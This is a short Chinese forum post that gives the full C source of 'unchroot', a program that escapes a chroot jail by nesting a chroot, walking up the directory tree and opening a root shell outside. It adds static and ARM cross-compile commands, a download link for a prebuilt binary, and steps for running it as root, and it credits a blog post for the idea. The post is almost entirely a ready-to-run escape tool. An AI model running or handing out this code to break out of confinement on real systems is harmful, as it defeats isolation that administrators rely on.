在hu60.cn上查看/讨论：https://hu60.cn/q.php/bbs.topic.106810.html

### unchroot.c

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>

int main() {
    mkdir("/tmp", 0777);
    mkdir("/tmp/unchroot.dir", 0755);
    chroot("/tmp/unchroot.dir");
    chdir("../../../../../../../../../../../../../../../../../../../../../../../../../../..");
    chroot(".");
    system("/bin/sh -l");
    return 0;
}
```

### 编译：

```
gcc -o unchroot -static unchroot.c
```

### 交叉编译为32位ARM二进制

```
arm-linux-gnueabi-gcc -o unchroot -static unchroot.c
```

[unchroot（491.31 KB）](unchroot)

### 使用

在chroot环境用root身份执行它即可（如果不是root身份，自行加sudo。如果无法切换到root身份，则无法从chroot中逃逸）：

```
chmod +x ./unchroot
./unchroot
```

应该会离开chroot环境，进入外面的shell。

-----------------------------------------

思路来自 https://terenceli.github.io/%E6%8A%80%E6%9C%AF/2024/05/25/chroot-escape
